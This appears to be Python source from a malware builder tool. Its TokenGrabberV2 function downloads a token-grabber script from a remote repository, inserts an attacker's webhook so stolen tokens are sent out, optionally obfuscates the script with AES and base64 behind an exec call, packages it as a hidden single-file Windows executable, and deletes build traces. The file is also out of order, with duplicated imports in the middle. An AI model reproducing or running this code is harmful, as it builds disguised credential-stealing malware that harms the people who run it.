def setTitle(_str):
    system = os.name
    if system == 'nt':
        #if its windows
        ctypes.windll.kernel32.SetConsoleTitleW(f"{_str} | Made By Rdimo")
    elif system == 'posix':
        #if its linux
        sys.stdout.write(f"\x1b]0;{_str} | Made By Rdimo\x07")
    else:
        #if its something else or some err happend for some reason, we do nothing
        pass


def installPackage(dependencies):
    print(f'{Fore.CYAN}Checking packages. . .{Fore.RESET}')
    if sys.argv[0].endswith('.exe'):
            #get all installed libs
            reqs = subprocess.check_output(['python', '-m', 'pip', 'freeze'])
            installed_packages = [r.decode().split('==')[0].lower() for r in reqs.split()]

            for lib in dependencies:
                #check for missing libs 
                if lib not in installed_packages:
                    #install the lib if it wasn't found
                    print(f"{Fore.BLUE}{lib}{Fore.RED} not found! Installing it for you. . .{Fore.RESET}")
                    try:
                        subprocess.check_call(['python', '-m', 'pip', 'install', lib])
                    #incase something goes wrong we notify the user that something happend
                    except Exception as e:
                        print(f"{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : {e}")
                        sleep(0.5)
                        pass
    else:
        for i in dependencies:
            if not pylibcheck.checkPackage(i):
                print(f"{Fore.BLUE}{i}{Fore.RED} not found! Installing it for you. . .{Fore.RESET}")
                pylibcheck.installPackage(i)
import os
import re
import io
import sys
import time
import json
import shutil
import ctypes
import random
import zipfile
import requests
import threading
import subprocess
import pylibcheck

from urllib.request import urlopen, urlretrieve
from distutils.version import LooseVersion
from bs4 import BeautifulSoup
from colorama import Fore
from time import sleep
import os
import shutil
import main
import requests
import base64
import random
import PyInstaller.__main__

from Crypto.Cipher import AES
from Crypto import Random
from colorama import Fore
def TokenGrabberV2(WebHook, fileName):
    required = [
        'requests',
        'psutil',
        'pypiwin32',
        'pycryptodome',
        'pyinstaller',
        'pillow',
    ]
    installPackage(required)
    code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", WebHook)
    with open(f"{fileName}.py", 'w', errors="ignore") as f:
        f.write(code)

    print(f"Do you want to obfuscate {fileName}.exe?")
    yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}y/n: {Fore.RED}')
    if yesno.lower() == "y" or yesno.lower() == "yes":
        IV = Random.new().read(AES.block_size)
        key = u''
        for i in range(8):
            key = key + chr(random.randint(0x4E00, 0x9FA5))

        with open(f'{fileName}.py') as f: 
            _file = f.read()
            imports = ''
            input_file = _file.splitlines()
            for i in input_file:
                if i.startswith("import") or i.startswith("from"):
                    imports += i+';'

        with open(f'{fileName}.py', "wb") as f:
            encodedBytes = base64.b64encode(_file.encode())
            obfuscatedBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(encodedBytes)
            f.write(f'{imports}exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())

    print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
    setTitle(f"Creating {fileName}.exe")
    #the equivalent to "pyinstaller {fileName}.py -n {fileName} --onefile --noconsole --log-level=INFO -i NONE"
    # PyInstaller.__main__.run([
    #     '%s.py' % fileName,
    #     '--name=%s' % fileName,
    #     '--onefile',
    #     '--clean',
    #     '--noconsole',
    #     '--log-level=INFO',
    #     '--icon=NONE',
    # ])
    os.system(f"pyinstaller --onefile --noconsole --clean --log-level=INFO -i NONE -n {fileName} {fileName}.py")
    try:
        #clean build files
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
        os.remove(f'{fileName}.py')
    except FileNotFoundError:
        pass

    print(f"\n{Fore.GREEN}File created as {fileName}.exe\n")
    input(f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue . . .  {Fore.RED}')
    main.main()
